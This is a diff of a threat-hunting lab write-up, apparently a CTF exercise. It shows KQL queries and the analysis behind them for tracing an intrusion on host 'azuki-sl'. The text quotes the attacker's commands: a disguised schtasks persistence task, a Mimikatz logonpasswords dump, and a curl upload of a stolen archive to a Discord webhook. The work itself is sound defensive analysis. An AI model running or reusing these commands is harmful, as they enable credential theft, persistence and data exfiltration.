@@ -230,7 +230,7 @@ Objective: **Identify the name of the scheduled task created for persistence?**
 
 Scheduled tasks provide reliable persistence across system reboots. The task name often attempts to blend with legitimate Windows maintenance routines.
 
-BLAH BLAH BLAH
+To find out if the attacker set any scheduled tasks, I checked `DeviceProcessEvents` to see if `schtasks` was ever ran. 
 ```KQL
 DeviceProcessEvents
 | where DeviceName == "azuki-sl"
@@ -241,10 +241,14 @@ DeviceProcessEvents
 ```
 <img width="1276" height="346" alt="Screenshot 2026-01-07 at 7 18 31 PM" src="https://github.com/user-attachments/assets/562912c0-b215-4abc-a8b0-b84f3c25e0a9" />
 
-`"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f`
+From the query, we can see that the attacker did createa a scheduled task by running `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f`
+- `/create /tn "Windows Update Check"` create task name `Windows Upadte Check`
+- `/tr C:ProgramData\WindowsCache\svchost.exe` run malicious `svchost.exe`
+- `/sc daily /st 2:00` run daily at 2:00 am
+- `/ru SYSTEM` run tasks from SYSTEM
+- `f` force
 
-
-BLAH BLAH BLAH 
+The attacker created a scheduled task to run their malware `svchost.exe`. It's also persistent since the task runs every day at 0200. So even after the system is rebooted, if the system is active at 0200, this task will automatically run. Additionally, they tried masquerading this scheduled task with the name `Windows Update Check` as if this was a legitimate task set by Windows.
 
 Flag: `Windows Update Check` <br>
 Timestamp: `2025-11-19T19:07:46.9796512Z`
@@ -264,16 +268,18 @@ Objective: **Identify the IP address of the command and control server?**
 
 Command and control infrastructure allows attackers to remotely control compromised systems. Identifying C2 servers enables network blocking and infrastructure tracking.
 
-BLAHBLAHBLAH
+If the attacker were to setup some form of C2, they would most likely be operating from one of the two directories excluded from Windows Defender security checks. So within `DeviceNetworkEvents`, I searched for these two folders in `InitiatngProcessFolderPath`.
 ```KQL
 DeviceNetworkEvents
 | where DeviceName == "azuki-sl"
 | where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
-| where InitiatingProcessFolderPath contains "C:\\ProgramData\\WindowsCache\\svchost.exe"
+| where InitiatingProcessFolderPath has_any  ("C:\\ProgramData\\WindowsCache", "C:\\Users\\KENJI~1.SAT\\AppData\\Local\\Temp")
+| sort by Timestamp asc
 ```
 <img width="1878" height="378" alt="Screenshot_35" src="https://github.com/user-attachments/assets/1a9cad2c-1dc3-4971-896b-d5de9179e92a" />
 
-BLAH BLAH BLAH 
+Which is true as there is a single successful connection coming from `C:\ProgramData\WindowsCache` that connects to `78.141.196.6`
+This can be cross-referenced from the command discovered in Flag 7 as this is the same IP address that was used to downlaod the malware. 
 
 Flag: `78.141.196.6` <br>
 Timestamp: `2025-11-19T19:11:04.1766386Z`
@@ -283,10 +289,7 @@ Objective: **Identify the destination port used for command and control communic
 
 C2 communication ports can indicate the framework or protocol used. This information supports network detection rules and threat intelligence correlation.
 
-BLAH BLAH BLAH 
-```KQL
-same as above
-```
+From the query and screenshot the attacker was able to connect to `78.141.196.6` over port `443` 
 
 Flag: `443` <br>
 Timestamp: `2025-11-19T19:11:04.1766386Z`
@@ -296,16 +299,28 @@ Objective: **Identify the filename of the credential dumping tool?**
 
 Credential dumping tools extract authentication secrets from system memory. These tools are typically renamed to avoid signature-based detection.
 
-BLAH BLAH BLAH 
+Again, if I were in the attacker's shoes, the only safe location I would be executing malware from would be the two directories excluded from Windows Defender scanning.
+
 ```KQL
 DeviceFileEvents
 | where DeviceName == "azuki-sl"
 | where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
-| where FolderPath contains "C:\\ProgramData\\WindowsCache"
+| where FolderPath has_any ("C:\\ProgramData\\WindowsCache", "C:\\Users\\KENJI~1.SAT\\AppData\\Local\\Temp")
+| sort by Timestamp asc
 ```
 <img width="1179" height="399" alt="Screenshot 2026-01-07 at 7 27 53 PM" src="https://github.com/user-attachments/assets/ecb70c7e-3742-4728-bf3a-72207be9b554" />
 
-BLAH BLAH BLAH
+Searching these two different locations return the following files located in these directories:
+- `export-data.zip` potential archive of exfiltrated data
+- `mm.exe` unknown executable downloaded from `78.141.196.6`
+- `svchost.exe` file executed in malicious scheduled task
+
+Since Sentinel also collects the SHA256 hash of files, we can grab the hash of `mm.exe` (`61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1`), and toss this into [VirusTotal](https://www.virustotal.com/) to see if any security vendors have flagged this file before:
+<img width="1199" height="684" alt="Screenshot 2026-01-09 at 6 44 15 PM" src="https://github.com/user-attachments/assets/ae26bffd-6529-44dd-988c-94e9cd03c0ab" />
+
+Boom. 65/71 hits on this SHA 256 Hash. <br>
+
+The attacker is using [Mimikatz](https://attack.mitre.org/software/S0002/), a popular credential dumper used to collect Windows logins and passwords that are stored in cleartext. The attacker renamed their malware to `mm.exe` to be less suspicious. 
 
 Flag: `mm.exe` <br>
 Timestamp: `2025-11-19T19:07:22.8551193Z`
@@ -315,7 +330,7 @@ Objective: **Identify the module used to extract logon passwords from memory?**
 
 Credential dumping tools use specific modules to extract passwords from security subsystems. Documenting the exact technique used aids in detection engineering.
 
-BLAH BLAH BLAH
+Thankfully, [Mimikatz](https://github.com/ParrotSec/mimikatz) is open source so we can figure out what the attacker did if it was actually executed on this machine.
 ```KQL
 DeviceProcessEvents
 | where DeviceName == "azuki-sl"
@@ -326,7 +341,10 @@ DeviceProcessEvents
 ```
 <img width="1272" height="345" alt="Screenshot 2026-01-07 at 7 30 10 PM" src="https://github.com/user-attachments/assets/0ae9a21c-11df-4dbd-abca-ca8f4ee637db" />
 
-BLAH BLAH BLAH 
+`mm.exe` was ran a single time from the command line using `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`
+- `privilege::debug` grants user to debug or interact with running processes
+- `sekurlsa::logonpasswords` mimikatz payload to caputre credentials from LSASS memory
+- `exit` closes mimikatz after dumping credentials
 
 Flag: `sekurlsa::logonpasswords` <br>
 Timestamp: `2025-11-19T19:08:26.2804285Z`
@@ -336,7 +354,7 @@ Objective: **Identify the compressed archive filename used for data exfiltration
 
 Attackers compress stolen data for efficient exfiltration. The archive filename often includes dates or descriptive names for the attacker's organisation.
 
-BLAH BLAH BLAH
+We've already seen `export-data.zip` located in `C:\ProgramData\WindowsCache` but let's see if there are any other archive files in this directory.
 ```KQL
 DeviceFileEvents
 | where DeviceName == "azuki-sl"
@@ -348,7 +366,7 @@ DeviceFileEvents
 ```
 <img width="1277" height="322" alt="Screenshot 2026-01-07 at 7 32 38 PM" src="https://github.com/user-attachments/assets/ff00ff6c-354f-4ec4-8fb0-704cfdc52ac9" />
 
-BLAH BLAH BLAH 
+Nope. `export-data.zip` is the only one discovered. This archive most likely contains all of the captured data and is going to be exfiltrated from the system.
 
 Flag: `export-data.zip` <br>
 Timestamp: `2025-11-19T19:08:58.0244963Z`
@@ -358,7 +376,7 @@ Objective: **Identify the cloud service used to exfiltrate stolen data?**
 
 Cloud services with upload capabilities are frequently abused for data theft. Identifying the service helps with incident scope determination and potential data recovery.
 
-BLAH BLAH BLAH 
+We have an idea of what archive contains captured data, so let's look if any network events contain it:
 ```KQL
 DeviceNetworkEvents
 | where DeviceName == "azuki-sl"
@@ -371,7 +389,14 @@ DeviceNetworkEvents
 ```
 <img width="1271" height="311" alt="Screenshot 2026-01-07 at 7 34 43 PM" src="https://github.com/user-attachments/assets/789fc949-9046-4cd5-8c95-4361c0445ed3" />
 
-BLAH BLAH LBHA 
+Unfortunately there is a successful outbound connection containing this file. The attacker was able to run the command 
+`"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8`
+- `curl.exe` command line tool used to transfer data
+- `-F` form data POST request
+- `file=@C:\ProgramData\WindowsCache\export-data.zip` target file
+- `https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8` output location
+
+Based on this command, the attacker was able to exfiltrate this archive to `Discord`. 
 
 Flag: `discord` <br>
 Timestamp: `2025-11-19T19:09:21.4234133Z`
@@ -381,16 +406,20 @@ Objective: **Identify the first Windows event log cleared by the attacker?**
 
 Clearing event logs destroys forensic evidence and impedes investigation efforts. The order of log clearing can indicate attacker priorities and sophistication.
 
-BLAH BLAH BLAH
+`wevutil.exe` is a Windows tool that allows the user to manage event logs. This can be utilized by attackers to erase evidence of thier activity. 
 ```KQL
 DeviceProcessEvents
 | where DeviceName == "azuki-sl"
 | where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20)) 
 | where ProcessCommandLine contains "wevtutil"
+| sort by Timestamp asc
 ```
 <img width="1290" height="561" alt="Screenshot 2026-01-07 at 7 38 33 PM" src="https://github.com/user-attachments/assets/ae50f18d-1bd4-404d-bcf7-102d943ff7f0" />
 
-BLAH BLAH BLAH
+The attacker was able to run wevutil multiple times to clear the following log types:
+- `Security`
+- `System`
+- `Application`
 
 Flag: `Security` <br>
 Timestamp: `2025-11-19T19:11:39.0934399Z`
